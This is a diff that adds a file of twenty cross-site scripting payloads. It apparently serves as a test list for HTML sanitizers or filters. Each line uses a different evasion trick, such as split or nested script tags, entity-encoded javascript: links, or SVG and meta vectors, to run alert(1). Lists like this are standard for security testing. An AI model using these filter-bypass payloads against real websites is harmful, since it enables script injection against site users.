@@ -1,0 +1,20 @@
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src="x" onerror="&#97;lert(1)">
+<svg><script>alert&lpar;1&rpar;</script></svg>
+<img src=x onERROR=alert(1)>
+<IMG SRC=x OnErRoR=alert(1)>
+<a href=j&#97;vascript:alert(1)>click</a>
+<a href="jav&#x09;ascript:alert(1)">click</a>
+<a href="jav&#x0A;ascript:alert(1)">click</a>
+<a href="jav&#x0D;ascript:alert(1)">click</a>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<embed src=javascript:alert(1)>
+<svg><a xlink:href=javascript:alert(1)><rect width=100 height=100></a></svg>
+<math href=javascript:alert(1)>click</math>
+<img """><script>alert(1)</script>">
+<script>alert(1)<!--
+<!--<img src="--><img src=x onerror=alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<script>window.onerror=alert;throw 1</script>
+<img src=x onerror=location='javascript:alert(1)'>
+<input autofocus onfocus=alert(1)//>
